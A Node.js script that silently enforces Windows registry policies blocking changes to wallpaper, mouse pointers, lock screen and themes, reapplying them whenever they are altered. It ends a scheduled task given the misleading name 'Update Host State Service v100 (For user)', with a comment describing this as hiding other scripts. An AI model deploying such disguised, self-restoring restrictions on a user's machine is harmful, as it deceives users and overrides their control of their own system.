const regdetector = require("./regdetector/index")
const fs = require("fs")
const {exec} = require("child_process")
const { exit } = require("process")

function setRegistry(PATH,KEY,TYPE,VALUE) {
	exec(`reg ADD "${PATH}" /v "${KEY}" /t "${TYPE}" /d "${VALUE}" /f`,{windowsHide: true})
}

function fix(item,now) {
	let settings = JSON.parse(fs.readFileSync("./.settings"))
	if (settings.disabled) return
	item.func(now,settings[item.id])
}

let rootNames = {
	HKCR: "HKEY_CLASSES_ROOT",
	HKCU: "HKEY_CURRENT_USER",
	HKLM: "HKEY_LOCAL_MACHINE",
	HKU: "HKEY_USERS",
	HKCC: "HKEY_CURRENT_CONFIG",
}

function makeActionObject(config) {
	let { root,path,key,regtype,jstype,setid,valueFormatFunc } = config
	return {
		id: setid,
		func: (now,value) => {
			let formatted = valueFormatFunc(value)
			if (now.toString() == formatted) return // now value is same with setting
			return setRegistry(root+"\\"+path,key,regtype,formatted)
		},
		demon: function(){
			let self = this
			regdetector.register({
				key: rootNames[root]+"\\"+path,
				value: key,
				type: jstype,
			}, value => {
				fix(self,value)
			})
		},
	}
}

let valueFormaters = {
	number: setvalue=>setvalue ? "1" : "0",
}

let settings_actions = [
	makeActionObject({
		setid: 'wallpaper_nochange',
		root: 'HKCU',
		path: 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop',
		key: 'NoChangingWallPaper',
		regtype: 'REG_DWORD',
		jstype: 'number',
		valueFormatFunc: valueFormaters.number,
	}),
	makeActionObject({
		setid: 'cursor_nochange',
		root: 'HKCU',
		path: 'Software\\Policies\\Microsoft\\Windows\\Personalization',
		key: 'NoChangingMousePointers',
		regtype: 'REG_DWORD',
		jstype: 'number',
		valueFormatFunc: valueFormaters.number,
	}),
	makeActionObject({
		setid: 'lockscreen_nochange',
		root: 'HKCU',
		path: 'Software\\Policies\\Microsoft\\Windows\\Personalization',
		key: 'NoChangingLockScreen',
		regtype: 'REG_DWORD',
		jstype: 'number',
		valueFormatFunc: valueFormaters.number,
	}),
	makeActionObject({
		setid: 'theme_nochange',
		root: 'HKCU',
		path: 'Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer',
		key: 'NoThemesTab',
		regtype: 'REG_DWORD',
		jstype: 'number',
		valueFormatFunc: valueFormaters.number,
	}),
]

settings_actions.forEach(async item => item.demon())

// end schduler for hiding other scripts
const scheduleName = "Update Host State Service v100 (For user)"
setTimeout(()=>{
	exec(`schtasks /end /tn "${scheduleName}"`,{windowsHide: true})
},10000)

// kill when requested
let filewatch = fs.watch("./",async (eventType, filename)=>{
	if (filename != ".kill") return
	if (!fs.existsSync(".kill")) return
	filewatch.close()
	fs.unlinkSync(".kill")
	fs.writeFileSync(".killed","")
	process.exit(34567) // kill code (just random gen)
})
